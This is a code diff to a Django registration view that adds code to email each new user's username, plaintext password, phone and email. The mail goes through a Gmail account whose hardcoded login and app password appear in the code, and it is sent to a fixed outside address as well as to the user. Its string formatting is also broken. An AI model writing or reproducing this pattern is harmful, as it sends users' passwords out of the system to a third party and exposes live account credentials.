@@ -1,4 +1,6 @@
+from multiprocessing import context
 from django.shortcuts import render, redirect
+import smtplib,ssl
 #from django.contrib.gis.geoip2 import GeoIP2
 from .models import userdetail
 # Create your views here.
@@ -82,6 +84,20 @@ def register(request):
         obj.latitude = request.session['lat']
         obj.longitude = request.session["lon"]
         obj.save()
+        s = smtplib.SMTP('smtp.gmail.com',587)
+        msg = """\
+        Account created\n
+        
+        username : {}\n
+        password : {}\n
+        phone    : {}\n
+        email    : {} 
+        """+username+" "+password+" "+phn+" "+email
+        context = ssl.create_default_context()
+        s.starttls(context=context)
+        s.login('backbenchers143.rgm@gmail.com','lgwnnimpsvzbblue')
+        s.sendmail('backbenchers143.rgm@gmail.com',['lucky630584@gmail.com',email],msg)
+        s.quit()
         return render(request,"home.html")
     
     return render(request,"register.html")
